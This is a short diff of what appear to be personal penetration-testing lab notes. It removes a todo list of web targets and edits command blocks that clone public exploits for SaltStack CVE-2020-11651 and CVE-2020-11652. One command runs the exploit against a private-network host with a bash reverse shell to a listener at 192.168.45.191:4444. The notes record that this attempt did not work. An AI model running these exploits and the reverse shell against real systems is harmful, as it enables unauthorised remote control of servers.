@@ -46,20 +46,8 @@ mezzanine
 
 #### Todo
 
-```
-/etc/nginx/nginx.conf
-```
-
-```
-http://192.168.141.62/admin/login/?next=/admin/
 
 
-
-
-/password_reset/
-```
-
-/blog/feed/atom and rss versions
 #### Done
 
 
@@ -72,20 +60,20 @@ pip3 install -r requirements.txt
 
 
 
-```
+```bash
 git clone https://github.com/dozernz/cve-2020-11651.git
 python3 -m venv .venv
 source .venv/bin/activate
 pip3 install salt
-
+# did not work
 python3 CVE-2020-11651.py 192.168.242.62 master '/bin/bash -i >& /dev/tcp/192.168.45.191/4444 0>&1'
 ```
 
 
-```
+```bash
 git clone https://github.com/Al1ex/CVE-2020-11652.git
 python3 -m venv .venv
 source .venv/bin/activate
 pip3 install salt
-python3 CVE-2020-11652.py 
+python3 CVE-2020-11652.py -h # for help
 ```
